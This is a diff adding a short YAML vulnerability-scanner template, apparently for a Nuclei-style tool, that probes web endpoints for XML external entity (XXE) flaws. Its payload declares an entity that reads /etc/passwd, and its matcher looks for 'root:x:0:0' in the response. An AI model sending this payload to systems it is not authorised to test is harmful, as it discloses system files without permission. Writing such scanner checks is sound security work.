@@ -1,0 +1,22 @@
+id: xxe3-30
+name: 'XXE DoS/entity in content'
+severity: high
+type: active
+tags:
+  - xxe
+  - injection
+  - xml
+  - dos
+description: 'XXE entity via content'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      content:
+        - '<!DOCTYPE r [<!ENTITY xxe PUBLIC "x" "file:///etc/passwd">]><r>&xxe;</r>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
+          - 'XXE_OK'
